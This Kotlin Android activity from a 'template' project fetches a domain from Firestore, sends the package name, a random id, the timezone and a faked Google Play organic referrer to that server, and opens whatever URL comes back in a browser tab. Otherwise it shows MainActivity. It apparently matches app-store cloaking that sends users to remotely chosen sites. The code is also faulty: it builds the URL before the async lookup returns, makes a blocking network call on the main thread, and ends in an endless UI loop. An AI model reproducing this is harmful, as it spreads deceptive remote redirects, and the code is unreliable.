package com.template

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.ConnectivityManager
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.widget.ProgressBar
import androidx.browser.customtabs.CustomTabColorSchemeParams
import androidx.browser.customtabs.CustomTabsIntent
import androidx.core.content.ContextCompat
import java.util.*

class LoadingActivity : AppCompatActivity() {

    private var domenFromFirebase = ""
    private var link = ""
    private var isFirestoreUrlNullOrEmpty = false
    private var isFinalUrlExist = false


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_loading)

        val finalUrlPreferences = getSharedPreferences(APP_PREFERENCES, Context.MODE_PRIVATE)

        if ((getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager)
                .isDefaultNetworkActive
        ) {
            if (finalUrlPreferences.contains(URL)) {
                val url = finalUrlPreferences.getString(URL, "")
                customTabsStart(url!!)
            }

            if (isFirestoreUrlNullOrEmpty) {
                preferencesEdit(
                    finalUrlPreferences,
                    IS_FIRESTORE_URL_NULL_OR_EMPTY,
                    isFirestoreUrlNullOrEmpty
                )
                startActivity(Intent(this, MainActivity::class.java))
            } else {
                if (isFinalUrlExist) {
                    preferencesEdit(finalUrlPreferences, IS_FINAL_URL_EXIST, isFinalUrlExist)
                    val url = finalUrlPreferences.getString(URL, "")
                    customTabsStart(url!!)
                } else {
                    (application as App).firestoreDb.collection("database")
                        .document("check")
                        .get().addOnSuccessListener { document ->
                            if (document != null) {
                                isFirestoreUrlNullOrEmpty = false
                                preferencesEdit(
                                    finalUrlPreferences,
                                    IS_FIRESTORE_URL_NULL_OR_EMPTY,
                                    isFirestoreUrlNullOrEmpty
                                )
                                domenFromFirebase = document.get("link").toString()
                                Log.d("look at", domenFromFirebase)
                            } else {
                                isFirestoreUrlNullOrEmpty = true
                                preferencesEdit(
                                    finalUrlPreferences,
                                    IS_FIRESTORE_URL_NULL_OR_EMPTY,
                                    isFirestoreUrlNullOrEmpty
                                )
                                startActivity(Intent(this, MainActivity::class.java))
                            }
                        }

                    link = "$domenFromFirebase/?" +
                            "packageid=$packageName" +
                            "&usserid=${UUID.randomUUID()}" +
                            "&getz=${TimeZone.getDefault()}" +
                            "&getr=utm_source=google-play&utm_medium=organic"
                    Log.d("look at", link)

                    val retofitClient = RetrofitService.getClient(link).create(
                        RetrofitClient::class.java
                    )
                    val response = retofitClient.getUrl()

                    if (response.isSuccessful) {
                        isFinalUrlExist = true
                        val url = response.body().toString()
                        Log.d("look at", url)
                        finalUrlPreferences.edit()
                            .putString(URL, url)
                            .putBoolean(IS_FINAL_URL_EXIST, isFinalUrlExist)
                            .apply()

                        customTabsStart(url)
                    } else {
                        isFirestoreUrlNullOrEmpty = true
                        preferencesEdit(
                            finalUrlPreferences,
                            IS_FIRESTORE_URL_NULL_OR_EMPTY,
                            isFirestoreUrlNullOrEmpty
                        )
                        startActivity(Intent(this, MainActivity::class.java))
                    }
                }
            }
        } else {
            startActivity(Intent(this, MainActivity::class.java))
        }
//        val userAgent =

        val progressBar = findViewById<ProgressBar>(R.id.loading_progress_bar)
        var progress = 0
        while (true) {
            if (progress == 10) progress = 0
            progressBar.progress = progress
            progress++
        }
    }

    private fun customTabsStart(url: String) {
        val customTabsIntent = CustomTabsIntent.Builder()
            .setDefaultColorSchemeParams(
                CustomTabColorSchemeParams.Builder()
                    .setToolbarColor(
                        ContextCompat.getColor(this, R.color.black)
                    ).build()
            ).build()
        customTabsIntent.launchUrl(this, Uri.parse(url))
    }

    private fun preferencesEdit(
        preferences: SharedPreferences,
        variableName: String,
        variable: Boolean
    ) {
        preferences.edit()
            .putBoolean(variableName, variable)
            .apply()
    }

    private fun checkPermission() {

    }

    companion object {
        const val APP_PREFERENCES = "APP_PREFERENCES"
        const val URL = "URL"
        const val IS_FINAL_URL_EXIST = "IS_FINAL_URL_EXIST"
        const val IS_FIRESTORE_URL_NULL_OR_EMPTY = "IS_FIRESTORE_URL_NULL_OR_EMPTY"
    }
}